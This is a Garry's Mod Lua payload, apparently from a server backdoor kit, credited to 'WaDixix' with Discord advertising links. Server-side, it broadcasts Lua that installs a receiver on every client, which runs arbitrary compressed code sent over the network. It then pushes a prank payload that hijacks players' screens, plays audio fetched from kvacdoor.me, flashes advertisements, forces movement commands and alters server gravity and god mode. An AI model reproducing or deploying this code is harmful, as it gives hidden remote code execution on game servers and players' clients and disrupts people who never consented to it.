if dancemove_ne_te_lance_pas_deux_fois_stp == true then return end
dancemove_ne_te_lance_pas_deux_fois_stp = true

timer.Simple(32,function()
    dancemove_ne_te_lance_pas_deux_fois_stp = false
end)


_G["util"]["AddNetworkString"]("dancemove")

BroadcastLua([[net.Receive("dancemove",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])        

print([[
██████╗  █████╗ ███╗   ██╗ ██████╗███████╗    ███╗   ███╗ ██████╗ ██╗   ██╗███████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔════╝    ████╗ ████║██╔═══██╗██║   ██║██╔════╝
██║  ██║███████║██╔██╗ ██║██║     █████╗      ██╔████╔██║██║   ██║██║   ██║█████╗  
██║  ██║██╔══██║██║╚██╗██║██║     ██╔══╝      ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  
██████╔╝██║  ██║██║ ╚████║╚██████╗███████╗    ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝    ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝
]])
-- ServerSide
-- by WaDixix
-- v1.2 (2020-01-07)
-- all reproduction prohibited !
-- https://discord.gg/6m4JweY

function hautbas()
    RunConsoleCommand("sv_gravity",0)

    timer.Simple(4,function()
        RunConsoleCommand("sv_gravity",9000)
        for k, v in pairs( player.GetAll() ) do
            v:GodEnable()
        end
    end)

    timer.Simple(5,function()
        RunConsoleCommand("sv_gravity",600)
        for k, v in pairs( player.GetAll() ) do
            v:GodDisable()
        end
    end)

end

hautbas()
timer.Simple(10,function()
    hautbas()
end)
timer.Simple(20,function()
    hautbas()
end)

local code = _G["util"]["Compress"]([=[
-- ClientSide
-- by WaDixix
-- v1.2 (2020-01-07)
-- all reproduction prohibited !
-- https://discord.gg/6m4JweY

print([[
██████╗  █████╗ ███╗   ██╗ ██████╗███████╗    ███╗   ███╗ ██████╗ ██╗   ██╗███████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔════╝    ████╗ ████║██╔═══██╗██║   ██║██╔════╝
██║  ██║███████║██╔██╗ ██║██║     █████╗      ██╔████╔██║██║   ██║██║   ██║█████╗  
██║  ██║██╔══██║██║╚██╗██║██║     ██╔══╝      ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  
██████╔╝██║  ██║██║ ╚████║╚██████╗███████╗    ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝    ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝
]])

sound.PlayURL("https://kvacdoor.me/assets/dancemove1.mp3","mono noblock noplay",function(s)
    timer.Simple(1, function()
        s:Play()
        s:SetVolume(2)
        hook.Add( 'HUDPaint','center_text',function() 
            draw.SimpleTextOutlined( 'https://discord.gg/tzB9phQJkb', 'DermaLarge',ScrW()/2 + math.sin(RealTime()) * ScrW() / 48, ScrH()/4 + math.cos(RealTime()) * ScrH() / 48, Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 0, 0, 255, 255 ) ) 
            draw.SimpleTextOutlined( 'Go Buy Games Manager', 'DermaLarge',ScrW()/2, ScrH()/1.55 + math.sin(RealTime()) * ScrH() / 3.50, Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 0, 0, 255, 255 ) ) 
        end)
    end)
    timer.Simple(31,function()
        s:Stop()
    end)
end)

local frame = vgui.Create("DFrame")
frame:SetSize(ScrW(),ScrH())
frame:SetDraggable(false)
frame:SetTitle("")
frame:ShowCloseButton(false)
frame.Paint = function(self,w,h)
    draw.RoundedBox(0,0,0,w,h,Color(66, 191, 244,100))
end

timer.Simple(31,function()
    frame:SetVisible(false)
end)

timer.Create("cheer_loop",2.7,15,function()
    for k,v in pairs (player.GetAll()) do 
        v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) 
    end
end)

local mat = Entity(0):GetMaterials()

timer.Create("party",1,31,function()

    local r = math.random(0,255)
    local g = math.random(0,255)
    local b = math.random(0,255)

    frame.Paint = function(self,w,h)
        draw.RoundedBox(0,0,0,w,h,Color(r, g, b,10))
    end

    for k, v in pairs( ents.GetAll() ) do
        v:SetColor(Color(r, g, b,255))
        v:SetRenderMode( RENDERMODE_TRANSALPHA )
    end

    for k, v in pairs( player.GetAll() ) do
        v:SetColor(Color(r, g, b,255))
        v:SetRenderMode( RENDERMODE_TRANSALPHA )
    end

    for k,v in pairs(mat) do
        local col = Color(r, g, b, 255)
        Material(v):SetVector("$color", Vector(col.r/220,col.g/220,col.b/220))
    end
end)

timer.Simple(32,function()
    local r = 255
    local g = 255
    local b = 255

    frame.Paint = function(self,w,h)
        draw.RoundedBox(0,0,0,w,h,Color(r, g, b,10))
    end

    for k, v in pairs( ents.GetAll() ) do
        v:SetColor(Color(r, g, b,255))
        v:SetRenderMode( RENDERMODE_TRANSALPHA )
    end

    for k, v in pairs( player.GetAll() ) do
        v:SetColor(Color(r, g, b,255))
        v:SetRenderMode( RENDERMODE_TRANSALPHA )
    end

    for k,v in pairs(mat) do
        local col = Color(r, g, b, 255)
        Material(v):SetVector("$color", Vector(col.r/220,col.g/220,col.b/220))
    end

    hook.Remove('HUDPaint','center_text')
end)

function haut()
    timer.Create("jump",1,3,function()
        RunConsoleCommand("+jump")
        timer.Simple(0.5,function()
            RunConsoleCommand("-jump")
        end)
    end)
end

function gauche()
    RunConsoleCommand("+moveleft")           
    timer.Simple(1.8,function()
        RunConsoleCommand("-moveleft")
    end)
end

function droite()
    RunConsoleCommand("+moveright")          
    timer.Simple(1.5,function()
        RunConsoleCommand("-moveright")
    end)
end

function tcouplet()
    haut()
    timer.Simple(6,function()
        gauche()
    end)
    timer.Simple(8.5,function()
        droite()
    end)
end

tcouplet()
timer.Simple(10,function()
    tcouplet()
end)
timer.Simple(20,function()
    tcouplet()
end)

]=])
local len = #code
net.Start("dancemove")
net.WriteUInt(len, 16)
net.WriteData(code, len)
timer.Simple(0.5, function()
    net.Broadcast()
end)